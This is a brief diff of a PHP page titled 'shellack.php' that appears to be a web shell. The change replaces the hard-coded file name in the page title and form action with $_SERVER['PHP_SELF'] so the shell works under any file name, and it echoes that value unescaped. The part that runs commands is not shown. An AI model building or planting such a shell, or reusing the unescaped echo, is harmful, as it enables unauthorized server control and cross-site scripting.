@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>shellack.php</title>
+    <title><?php echo $_SERVER['PHP_SELF']; ?></title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 body {
@@ -89,7 +89,7 @@ textarea {
 </style>
 </head>
 <body>
-<form action='shellack.php' method='POST'>
+<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method='POST'>
     <div class="containH"> 
     <div>
         <p>Working dir: <input type="text" name="wd" value="<?php echo htmlspecialchars($_POST[wd]);?>"></p>
